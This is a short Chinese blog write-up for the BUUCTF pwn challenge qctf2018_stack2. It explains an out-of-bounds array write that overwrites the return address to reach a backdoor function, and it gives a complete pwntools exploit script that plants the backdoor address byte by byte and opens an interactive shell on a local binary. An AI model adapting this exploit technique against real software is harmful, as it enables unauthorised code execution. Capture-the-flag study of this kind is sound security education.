---
title: BUUCTF-qctf2018_stack2 题解
date: 2026-01-12 09:58:00
tags: 
    - stack
    - pwn
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#qctf2018_stack2)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/qctf2018_stack2/checksec.png)

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/qctf2018_stack2/IDA.png)

有一个利用 v13 越界的漏洞，直接劫持返回地址到后门即可

### backdoor

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/qctf2018_stack2/backdoor.png)

### exp

```python
from pwn import *

context.log_level = "debug"
context.arch = "i386"

io = process("./stack2")

io.recvuntil(b"have:\n")
io.sendline(b'1')

io.recvuntil(b"numbers\n")
io.sendline(b'1')
io.recvuntil(b"exit\n")
io.sendline(b'3')
io.recvuntil(b"change:\n")
io.sendline(b'132')
io.recvuntil(b"number:\n")
io.sendline(b"155")

io.recvuntil(b"exit\n")
io.sendline(b'3')
io.recvuntil(b"change:\n")
io.sendline(b'133')
io.recvuntil(b"number:\n")
io.sendline(b"133")

io.recvuntil(b"exit\n")
io.sendline(b'3')
io.recvuntil(b"change:\n")
io.sendline(b'134')
io.recvuntil(b"number:\n")
io.sendline(b"4")

io.recvuntil(b"exit\n")
io.sendline(b'3')
io.recvuntil(b"change:\n")
io.sendline(b'135')
io.recvuntil(b"number:\n")
io.sendline(b"8")

io.recvuntil(b"exit\n")
io.sendline(b'5')

io.interactive()
```